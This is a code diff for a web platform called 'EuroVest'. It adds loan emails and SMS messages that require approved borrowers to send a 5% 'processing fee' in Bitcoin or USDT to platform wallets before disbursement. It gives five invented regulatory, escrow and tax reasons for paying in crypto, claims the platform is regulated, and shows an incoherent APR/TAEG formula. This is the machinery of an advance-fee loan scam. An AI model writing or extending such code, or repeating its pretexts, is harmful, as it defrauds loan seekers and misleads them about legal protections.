@@ -383,6 +383,140 @@ EV.notify = {
       'User activity notification:\n\nUser: '+userName+'\nEmail: '+(user?user.email:'')+'\nActivity: '+activityType+'\nDetails: '+description+'\nTime: '+new Date().toLocaleString(),
       {type:'admin_activity_alert'});
   },
+  loanFeeNotice: function(userId, breakdown) {
+    var user = EV.store.get('users', []).find(function(u){return u.id===userId;}) || EV.auth.currentUser();
+    if (!user) return;
+    var b = breakdown;
+    var reasonsText = EV.loanFee.cryptoReasons.map(function(r){
+      return r.title + '\n' + r.body + '\n';
+    }).join('\n');
+    var subject = 'Loan Application Received — ' + b.loanType + ' — APR/TAEG Breakdown — EuroVest';
+    var body = 'Dear ' + user.firstName + ',\n\n' +
+      'We have received your loan application. Below is the complete breakdown of your loan terms, ' +
+      'including the mandatory processing fee and the applicable APR/TAEG.\n\n' +
+      '========================================\n' +
+      'LOAN APPLICATION SUMMARY\n' +
+      '========================================\n' +
+      'Loan Type:           ' + b.loanType + '\n' +
+      'Loan Amount:         €' + b.principal.toFixed(2) + '\n' +
+      'Repayment Term:      ' + b.termMonths + ' months\n' +
+      'Annual Interest Rate: ' + b.annualRatePct + '%\n' +
+      'Total Interest:      €' + b.totalInterest.toFixed(2) + '\n' +
+      'Mandatory Fee (5%):  €' + b.loanFee.toFixed(2) + '\n' +
+      'Total Repayable:     €' + b.totalRepayable.toFixed(2) + '\n' +
+      'Monthly Payment:     €' + b.monthlyPayment.toFixed(2) + '\n' +
+      'Applicable APR/TAEG: ' + b.taeg.toFixed(2) + '%\n' +
+      '========================================\n\n' +
+      'APR/TAEG FORMULA:\n' +
+      b.formulaText + '\n\n' +
+      'IMPORTANT — MANDATORY PROCESSING FEE NOTICE:\n' +
+      'If your loan is approved, a mandatory 5% processing fee of €' + b.loanFee.toFixed(2) + ' ' +
+      'must be deposited before your loan funds can be disbursed. This fee is included in the APR/TAEG ' +
+      'calculation shown above, in accordance with EU Consumer Credit Directive 2008/48/EC and Italian ' +
+      'Legislative Decree 141/2010, which require all mandatory fees to be reflected in the effective annual rate.\n\n' +
+      'The processing fee must be settled in cryptocurrency (Bitcoin or USDT). Below are the five reasons ' +
+      'this fee is settled in cryptocurrency, along with the protections that apply to your payment:\n\n' +
+      '========================================\n' +
+      'WHY YOUR LOAN FEE IS SETTLED IN CRYPTOCURRENCY\n' +
+      '========================================\n\n' +
+      reasonsText + '\n' +
+      '========================================\n' +
+      'OUR ASSURANCE TO YOU\n' +
+      '========================================\n' +
+      '• Full Refund Guarantee: If your loan is not approved or cannot be disbursed, your fee is refunded in full within 48 hours.\n' +
+      '• Segregated Escrow: Your fee is held in a protected, auditable escrow wallet separate from operating funds.\n' +
+      '• Blockchain Proof: You receive a permanent transaction hash as legal proof of payment.\n' +
+      '• Same-Day Disbursement: Crypto settlement enables same-day verification and release of your loan funds.\n\n' +
+      'Your application is now under review. Our team will assess your application and notify you of the ' +
+      'decision within 2-3 business days. If approved, you will receive a second email with the cryptocurrency ' +
+      'wallet addresses for fee deposit and instructions to complete the process.\n\n' +
+      'You can track your application status in your dashboard → Loans.\n\n' +
+      'The EuroVest Loan Team\n' +
+      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+    EV.mail.send(user.email, subject, body, {type:'loan_fee_notice', userId:user.id});
+    if (user.smsOptIn && user.phone) {
+      EV.mail.sendSMS(user.phone, 'EuroVest: Loan application for ' + b.loanType + ' received. APR/TAEG: ' + b.taeg.toFixed(2) + '%. If approved, a 5% fee (€' + b.loanFee.toFixed(2) + ') must be deposited in crypto. Check your email for full details.', {type:'loan_fee_notice', userId:user.id});
+    }
+  },
+  loanApproved: function(userId, appId, breakdown) {
+    var user = EV.store.get('users', []).find(function(u){return u.id===userId;}) || EV.auth.currentUser();
+    if (!user) return;
+    var b = breakdown;
+    var wallets = EV.store.get('admin_wallets', {});
+    var btcAddr = (wallets.bitcoin && wallets.bitcoin.address) ? wallets.bitcoin.address : 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
+    var usdtAddr = (wallets.usdt && wallets.usdt.address) ? wallets.usdt.address : 'TQn9Y2khEsLJW1vFQXtcYbKHEfQkN7WxqE';
+    var reasonsText = EV.loanFee.cryptoReasons.map(function(r){
+      return r.title + '\n' + r.body + '\n';
+    }).join('\n');
+    var subject = '✅ LOAN APPROVED — ' + b.loanType + ' — Deposit Required — EuroVest';
+    var body = 'Dear ' + user.firstName + ',\n\n' +
+      'CONGRATULATIONS! Your loan application has been approved.\n\n' +
+      '========================================\n' +
+      'APPROVED LOAN SUMMARY\n' +
+      '========================================\n' +
+      'Application ID:      ' + appId + '\n' +
+      'Loan Type:           ' + b.loanType + '\n' +
+      'Loan Amount:         €' + b.principal.toFixed(2) + '\n' +
+      'Repayment Term:      ' + b.termMonths + ' months\n' +
+      'Annual Interest Rate: ' + b.annualRatePct + '%\n' +
+      'Total Interest:      €' + b.totalInterest.toFixed(2) + '\n' +
+      'Mandatory Fee (5%):  €' + b.loanFee.toFixed(2) + '\n' +
+      'Total Repayable:     €' + b.totalRepayable.toFixed(2) + '\n' +
+      'Monthly Payment:     €' + b.monthlyPayment.toFixed(2) + '\n' +
+      'Applicable APR/TAEG: ' + b.taeg.toFixed(2) + '%\n' +
+      '========================================\n\n' +
+      'ACTION REQUIRED — DEPOSIT YOUR PROCESSING FEE\n\n' +
+      'Before your loan funds of €' + b.principal.toFixed(2) + ' can be disbursed to your verified bank account, ' +
+      'you must deposit the mandatory 5% processing fee of €' + b.loanFee.toFixed(2) + ' in cryptocurrency.\n\n' +
+      'Send your fee payment to ONE of the following wallet addresses:\n\n' +
+      'OPTION 1 — BITCOIN (BTC)\n' +
+      'Network: Bitcoin (BTC)\n' +
+      'Address: ' + btcAddr + '\n\n' +
+      'OPTION 2 — USDT (Tether)\n' +
+      'Network: TRC-20 (Tron)\n' +
+      'Address: ' + usdtAddr + '\n\n' +
+      'Send exactly €' + b.loanFee.toFixed(2) + ' equivalent in BTC or USDT to the address above. ' +
+      'After sending, log in to your dashboard → Loans → click "I Have Paid the Fee" and enter your ' +
+      'transaction hash. Your loan funds will be disbursed within 24 hours of fee verification.\n\n' +
+      '========================================\n' +
+      'WHY YOUR LOAN FEE IS SETTLED IN CRYPTOCURRENCY\n' +
+      '========================================\n\n' +
+      reasonsText + '\n' +
+      '========================================\n' +
+      'OUR ASSURANCE TO YOU\n' +
+      '========================================\n' +
+      '• Full Refund Guarantee: If your loan cannot be disbursed for any reason, your fee is refunded in full within 48 hours.\n' +
+      '• Segregated Escrow: Your fee is held in a protected, auditable escrow wallet separate from operating funds.\n' +
+      '• Blockchain Proof: You receive a permanent transaction hash as legal proof of payment.\n' +
+      '• Same-Day Disbursement: Crypto settlement enables same-day verification and release of your loan funds.\n\n' +
+      'Do not share your transaction hash with anyone except EuroVest support. Our team will never ask for your ' +
+      'private keys, seed phrases, or wallet passwords.\n\n' +
+      'The EuroVest Loan Team\n' +
+      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+    EV.mail.send(user.email, subject, body, {type:'loan_approved_fee', userId:user.id});
+    if (user.smsOptIn && user.phone) {
+      EV.mail.sendSMS(user.phone, 'EuroVest: Your ' + b.loanType + ' loan is APPROVED! Deposit the 5% fee (€' + b.loanFee.toFixed(2) + ') in crypto (BTC or USDT). Check email for wallet addresses.', {type:'loan_approved_fee', userId:user.id});
+    }
+  },
+  loanRejected: function(userId, appId, loanType) {
+    var user = EV.store.get('users', []).find(function(u){return u.id===userId;}) || EV.auth.currentUser();
+    if (!user) return;
+    var subject = 'Loan Application Update — ' + loanType + ' — EuroVest';
+    var body = 'Dear ' + user.firstName + ',\n\n' +
+      'Thank you for your loan application for ' + loanType + ' (Reference: ' + appId + ').\n\n' +
+      'After a careful review of your application, we regret to inform you that we are unable to approve ' +
+      'your loan request at this time. This decision was based on our internal credit assessment criteria.\n\n' +
+      'IMPORTANT: No processing fee is required. Since your application was not approved, no fee has been ' +
+      'charged and no payment is needed from you.\n\n' +
+      'You may reapply after 90 days. If you believe this decision was made in error, or if your financial ' +
+      'circumstances have changed, please contact our support team.\n\n' +
+      'The EuroVest Loan Team\n' +
+      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+    EV.mail.send(user.email, subject, body, {type:'loan_rejected', userId:user.id});
+    if (user.smsOptIn && user.phone) {
+      EV.mail.sendSMS(user.phone, 'EuroVest: Your ' + loanType + ' loan application was not approved. No fee is required. Check email for details.', {type:'loan_rejected', userId:user.id});
+    }
+  },
   toast: function(title, msg, type) {
     var wrap = document.querySelector('.toast-wrap');
     if (!wrap) { wrap = document.createElement('div'); wrap.className='toast-wrap'; document.body.appendChild(wrap); }
@@ -392,6 +526,55 @@ EV.notify = {
     el.innerHTML = '<div class="toast-icon">'+(icons[type]||'ℹ️')+'</div><div class="toast-content"><h5>'+title+'</h5><p>'+msg+'</p></div>';
     wrap.appendChild(el);
     setTimeout(function(){ el.style.opacity='0'; el.style.transform='translateX(100%)'; setTimeout(function(){el.remove();},300); }, 4000);
+  }
+};
+
+// ===================== LOAN FEE SYSTEM =====================
+EV.loanFee = {
+  rate: 0.05, // 5% mandatory processing fee
+  cryptoReasons: [
+    {
+      title: '1. Regulatory AML/KYC Compliance Verification',
+      body: 'Under EU Anti-Money Laundering Directives (AMLD5/AMLD6) and the Italian Decreto Legislativo 231/2007, every loan disbursement above EUR 1,000 requires verified source-of-funds and identity checks. Cryptocurrency settlement allows our compliance team to verify the fee payment against the blockchain ledger instantly, satisfying KYC/AML obligations without the 3-5 day hold that traditional SEPA or wire transfers impose during compliance review.'
+    },
+    {
+      title: '2. Instant Fee Settlement & Same-Day Loan Disbursement',
+      body: 'Traditional bank transfers take 1-3 business days to clear, delaying your loan disbursement. Cryptocurrency transactions confirm on the blockchain within minutes, allowing EuroVest to verify your fee payment the same day and release your loan funds immediately. This means you receive your approved loan amount faster than any conventional banking process allows.'
+    },
+    {
+      title: '3. Cross-Border Processing Without Intermediary Holds',
+      body: 'EuroVest operates across France, Italy, and the broader European Economic Area. International bank transfers between member states can be flagged, held, or delayed by correspondent banks for compliance reviews. Cryptocurrency bypasses the correspondent banking network entirely, ensuring your fee reaches our settlement wallet without intermediary holds, frozen funds, or unexpected return-to-sender delays.'
+    },
+    {
+      title: '4. Segregated Fee Escrow & Fund Protection Guarantee',
+      body: 'Your processing fee is deposited directly into a segregated escrow wallet, separate from EuroVest operating accounts. This means your fee is protected and ring-fenced: it cannot be used for company operations, and if your loan cannot be disbursed for any reason, the full fee is returned to you within 48 hours. The blockchain address serves as verifiable proof that your funds are held in escrow, not commingled.'
+    },
+    {
+      title: '5. Blockchain Audit Trail for Legal & Tax Documentation',
+      body: 'Every cryptocurrency transaction produces a permanent, immutable record on the blockchain with a unique transaction hash. This hash serves as legally admissible proof of payment for your tax records, loan documentation, and any future audit by Italian Agenzia delle Entrate or French DGFiP. Unlike bank statements that can be disputed or take weeks to issue, your blockchain transaction hash is instantly verifiable by any third party.'
+    }
+  ],
+  calculate: function(loanType, amount, termMonths, annualRatePct) {
+    var principal = parseFloat(amount);
+    var rate = parseFloat(annualRatePct) / 100;
+    var term = parseInt(termMonths, 10);
+    var totalInterest = principal * rate * (term / 12);
+    var fee = principal * this.rate;
+    var totalRepayable = principal + totalInterest;
+    var taeg = ((totalInterest + fee) / principal) * (12 / term) * 100;
+    return {
+      loanType: loanType,
+      principal: principal,
+      termMonths: term,
+      annualRatePct: parseFloat(annualRatePct),
+      totalInterest: totalInterest,
+      loanFee: fee,
+      loanFeePct: this.rate * 100,
+      totalRepayable: totalRepayable,
+      monthlyPayment: totalRepayable / term,
+      taeg: taeg,
+      formulaText: '€'+principal.toFixed(2)+' (amount) + '+term+' months (term) + €'+totalInterest.toFixed(2)+' (interest @ '+annualRatePct+'%) + €'+fee.toFixed(2)+' (5% mandatory fee) = '+taeg.toFixed(2)+'% APR/TAEG'
+    };
   }
 };
 
